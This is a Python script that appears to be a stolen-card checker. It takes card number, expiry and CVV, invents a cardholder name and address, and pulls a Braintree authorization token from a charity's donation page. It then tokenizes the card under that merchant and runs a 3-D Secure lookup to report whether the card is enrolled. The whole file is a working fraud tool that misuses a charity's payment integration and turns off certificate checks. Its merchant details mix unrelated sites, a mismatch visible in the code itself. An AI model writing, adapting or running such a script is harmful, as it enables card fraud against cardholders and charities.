def vbv(card):
	
	import requests, re, base64, random, string, user_agent, time, uuid, jwt
		
	card = card.strip()
	parts = re.split('[|]', card)
	n = parts[0]
	mm = parts[1]
	yy = parts[2]
	cvc = parts[3]
	
	url = 'www.donate.stroke.org.uk'
	price = '10000'
	r = requests.session()
	characters = string.ascii_letters + string.digits

	def generate_full_name():
			first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", 
						   "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan",
						   "Amina", "Rania", "Hussein", "Maha", "Tarek", "Laila", "Abdul", "Hana", "Mustafa",
						   "Leila", "Kareem", "Hala", "Karim", "Nabil", "Samir", "Habiba", "Dina", "Youssef", "Rasha",
						   "Majid", "Nabil", "Nadia", "Sami", "Samar", "Amal", "Iman", "Tamer", "Fadi", "Ghada",
						   "Ali", "Yasmin", "Hassan", "Nadia", "Farah", "Khalid", "Mona", "Rami", "Aisha", "Omar",
						   "Eman", "Salma", "Yahya", "Yara", "Husam", "Diana", "Khaled", "Noura", "Rami", "Dalia",
						   "Khalil", "Laila", "Hassan", "Sara", "Hamza", "Amina", "Waleed", "Samar", "Ziad", "Reem",
						   "Yasser", "Lina", "Mazen", "Rana", "Tariq", "Maha", "Nasser", "Maya", "Raed", "Safia",
						   "Nizar", "Rawan", "Tamer", "Hala", "Majid", "Rasha", "Maher", "Heba", "Khaled", "Sally"] 
			
			last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown",
						   "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White",
						   "Ahmed", "Chen", "Singh", "Nguyen", "Wong", "Gupta", "Kumar",
						   "Gomez", "Lopez", "Hernandez", "Gonzalez", "Perez", "Sanchez", "Ramirez", "Torres", "Flores", "Rivera",
						   "Silva", "Reyes", "Alvarez", "Ruiz", "Fernandez", "Valdez", "Ramos", "Castillo", "Vazquez", "Mendoza",
						   "Bennett", "Bell", "Brooks", "Cook", "Cooper", "Clark", "Evans", "Foster", "Gray", "Howard",
						   "Hughes", "Kelly", "King", "Lewis", "Morris", "Nelson", "Perry", "Powell", "Reed", "Russell",
						   "Scott", "Stewart", "Taylor", "Turner", "Ward", "Watson", "Webb", "White", "Young"] 
			
			full_name = random.choice(first_names) + " " + random.choice(last_names)
			first_name, last_name = full_name.split()
			
			return first_name, last_name
		
	def generate_address():
			cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio", "San Diego", "Dallas", "San Jose"]
			states = ["NY", "CA", "IL", "TX", "AZ", "PA", "TX", "CA", "TX", "CA"]
			streets = ["Main St", "Park Ave", "Oak St", "Cedar St", "Maple Ave", "Elm St", "Washington St", "Lake St", "Hill St", "Maple St"]
			zip_codes = ["10001", "90001", "60601", "77001", "85001", "19101", "78201", "92101", "75201", "95101"]
		
			city = random.choice(cities)
			state = states[cities.index(city)]
			street_address = str(random.randint(1, 999)) + " " + random.choice(streets)
			zip_code = zip_codes[states.index(state)]
		
			return city, state, street_address, zip_code
		
		
	first_name, last_name = generate_full_name()
	city, state, street_address, zip_code = generate_address()
	
	def num():
		number = ''.join(random.choices(string.digits, k=7))
		return f"303{number}"
	num = num()

	def generate_random_account():
		name = ''.join(random.choices(string.ascii_lowercase, k=20))
		number = ''.join(random.choices(string.digits, k=4))
		return f"{name}{number}@gmail.com"
	acc = generate_random_account()
	
	
	def generar_uuid():
		  return str(uuid.uuid4())


	def plug_rnd():
			random_chars = "".join(random.choices(string.ascii_letters + string.digits, k=10))
			random_suffix = "".join(random.choices(string.ascii_letters + string.digits, k=28))
			random_yux = "".join(random.choices(string.ascii_letters + string.digits, k=3))
			return f"{random_chars}::{random_suffix}::{random_yux}"
	def capture(string, start, end):
				 start_pos, end_pos = string.find(start), string.find(
		end, string.find(start) + len(start)
	)
				 return (
		string[start_pos + len(start) : end_pos]
		if start_pos != -1 and end_pos != -1
		else None
	)
	
	import requests, re, base64, random, string, user_agent, time, uuid, jwt
		
	random_uuid = uuid.uuid4()
		
	ssid = (str(random_uuid))
		
	user = user_agent.generate_user_agent()
		
	r = requests.session()
	
	r.verify = False
		
		
	headers = {
	'accept': '*/*',
	'cache-control': 'no-cache',
	'pragma': 'no-cache',
	'user-agent': user,
}

	res = r.get(
	'https://touch.org.sg/content/touchprogram/get-involved/donation/jcr:content/root/container/container/donationforms.token.json',
	headers=headers,
)
 
	enc = res.text
	dec = base64.b64decode(enc).decode('utf-8')
	be=re.findall(r'"authorizationFingerprint":"(.*?)"',dec)[0]
		

	sessionId = generar_uuid()
	sessionId2 = generar_uuid()
	Fingerprint = "".join(random.choice("0123456789abcdef") for _ in range(32))
	plug = plug_rnd()
	plug2 = plug_rnd()

  
	me = capture(
			dec,
			"https://api.braintreegateway.com:443/merchants/",
			"/client_api/v1/configuration",
		)


	h2 = {
			"Host": "payments.braintree-api.com",
			"content-type": "application/json",
			"authorization": f"Bearer {be}",
			"user-agent": user,
			"braintree-version": "2018-05-10",
			"accept": "*/*",
			"origin": "https://assets.braintreegateway.com",
			"referer": "https://assets.braintreegateway.com/",
		}

	p2 = {
			"clientSdkMetadata": {
				"source": "client",
				"integration": "dropin2",
				"sessionId": f"{sessionId}",
			},
			"query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {	 token	 creditCard {	   bin	   brandCode	   last4	   cardholderName	   expirationMonth	  expirationYear	  binData {		 prepaid		 healthcare		 debit		 durbinRegulated		 commercial		 payroll		 issuingBank		 countryOfIssuance		 productId	   }	 }   } }",
			"variables": {
				"input": {
					"creditCard": {
						"number": f"{n}",
						"expirationMonth": f"{mm}",
						"expirationYear": f"{yy}",
						"cvv": f"{cvc}",
						"cardholderName": f"{first_name} {last_name}",
						"billingAddress": {"postalCode": f"{zip_code}"},
					},
					"options": {"validate": False},
				}
			},
			"operationName": "TokenizeCreditCard",
		}

	r2 = r.post(
			"https://payments.braintree-api.com/graphql",
			headers=h2,
			json=p2,
		)
	t2 = r2.text
	tok = capture(t2, '"token":"', '"')
	bin_ = capture(t2, '"bin":"', '"')


	h6 = {
			"Host": "api.braintreegateway.com",
			"user-agent": user,
			"content-type": "application/json",
			"accept": "*/*",
			"origin": f"https://{url}",
		}

	p6 = {
	'amount': '10000',
	'browserColorDepth': 24,
	'browserJavaEnabled': False,
	'browserJavascriptEnabled': True,
	'browserLanguage': 'en-US',
	'browserScreenHeight': 800,
	'browserScreenWidth': 360,
	'browserTimeZone': -180,
	'deviceChannel': 'Browser',
	'bin': '408832',
	'clientMetadata': {
		'requestedThreeDSecureVersion': '2',
		'sdkVersion': 'web/3.94.0',
		'cardinalDeviceDataCollectionTimeElapsed': 245,
		'issuerDeviceDataCollectionTimeElapsed': 592,
		'issuerDeviceDataCollectionResult': True,
	},
	'authorizationFingerprint': be,
	'braintreeLibraryVersion': 'braintree/web/3.94.0',
	'_meta': {
		'merchantAppId': 'mozartists.com',
		'platform': 'web',
		'sdkVersion': '3.94.0',
		'source': 'client',
		'integration': 'custom',
		'integrationType': 'custom',
	},
}

	r6 = r.post(
			f"https://api.braintreegateway.com/merchants/{me}/client_api/v1/payment_methods/{tok}/three_d_secure/lookup",
			headers=h6,
			json=p6,
		)
	t6 = r6.text
	status = capture(t6, '"status":"', '"')
	result = status.replace("_", " ").title()
	return result
